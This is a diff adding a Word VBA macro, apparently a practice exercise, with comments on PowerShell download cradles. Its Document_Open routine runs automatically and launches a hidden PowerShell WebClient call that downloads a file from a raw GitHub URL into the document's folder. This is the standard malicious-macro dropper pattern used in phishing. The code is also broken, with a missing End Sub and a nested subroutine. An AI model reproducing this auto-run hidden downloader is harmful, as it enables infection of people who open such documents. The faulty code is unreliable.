@@ -1,0 +1,31 @@
+'PowerShell Cradle
+'Call a class such as "Net.WebClient" and then instantiate it as an object via $wc = New-Object Net.Client
+'$ sets a variable in PowerShell. $wc is now a object stored within the variable.
+'Then call a method within the Net.WebClient class such as .DownloadFile or .UploadData.
+'Methods take parameters such as .DownloadFile taking URL and filename .DownloadFile(URL,outfile)
+'You must append the method and parameters to a instantiated object like so - $wc.DownloadFile("http://blah.com", "file.exe")
+'You can call the class inline with System.Net.WebClient (comes from the dll/assembly System.Net.WebClient.dll, as class if not instantiated).
+
+Sub Document_Open()
+
+Dim str As String
+str = "powershell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/P4nr4g3/Mal-VBA/main/Descriptions.txt','macro.txt')"
+Shell str, vbHide
+
+'The ActiveDocument.Path property allows a user to get the location of the current document. This can then be appended with the downloaded file.
+'The file downloaded using the Macro in a document will be downloaded in the directory of the document itself.
+
+
+Dim filepath As String
+filepath = ActiveDocument.Path + "\macro.txt"
+
+Sub Wait(n As Long)
+Dim t As Date
+t = Now
+Do
+DoEvents
+Loop Until Now >= DateAdd("s", n, t)
+
+End Sub
+
+
